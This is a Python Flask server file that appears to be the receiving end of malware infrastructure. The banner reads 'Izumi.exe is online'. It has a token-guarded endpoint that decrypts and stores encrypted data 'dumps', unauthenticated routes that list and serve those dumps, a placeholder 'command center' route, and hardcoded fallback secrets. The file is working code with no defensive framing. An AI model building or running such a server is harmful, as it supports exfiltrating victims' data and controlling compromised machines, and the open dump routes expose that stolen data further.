from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os
import json
import jwt
from functools import wraps
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import hashlib

SECRET_KEY = os.getenv('SECRET_KEY', 'FromThe104WeSurveyTheOtherSideOfTheSea')
AES_SECRET = os.getenv("AES_SECRET", "FromThe104")

def get_aes_key():
    return hashlib.sha256(AES_SECRET.encode()).digest()

def decrypt_aes(encrypted_data_b64):
    try:
        raw_data = base64.b64decode(encrypted_data_b64)
        iv = raw_data[:16]
        ciphertext = raw_data[16:]
        cipher = AES.new(get_aes_key(), AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return json.loads(plaintext.decode())
    except Exception as e:
        print(f"[DECRYPTION ERROR] {e}")
        return None
    
app = Flask(__name__)
DUMP_DIR  = 'dumps'
os.makedirs(DUMP_DIR, exist_ok=True)

def require_token(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'error': 'Missing token'}), 403
        try:
            jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 403
        return f(*args, **kwargs)
    return decorated

@app.route('/')
def index():
    return 'Izumi.exe is online...'

@app.route('/dump', methods=['POST', 'PUT'])
@require_token
def dump_data():

    encrypted_data = request.get_data(as_text=True)
    decrypted = decrypt_aes(encrypted_data)

    if not decrypted:
        return jsonify({'error': 'Decryption failed'}), 400

    timestamp = datetime.utcnow().strftime('%Y-%m-%dT%H-%M-%S')
    filename = f'dump-{timestamp}.json'
    filepath = os.path.join(DUMP_DIR, filename)
    with open(filepath, 'w') as f:
        json.dump(decrypted, f, indent=2)
    return jsonify({'status': 'ok', 'file': filename})

@app.route('/dumps', methods=['GET'])
def list_dumps():
    files = [f for f in os.listdir(DUMP_DIR) if f.endswith('.json')]
    return jsonify(files)

@app.route('/dumps/<path:filename>', methods=['GET'])
def get_dump(filename):
    return send_from_directory(DUMP_DIR, filename)

@app.route('/command', methods=['POST', 'GET'])
@require_token
def command_center():
    #Will be created later
    return jsonify({'status': "Waiting"})
if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))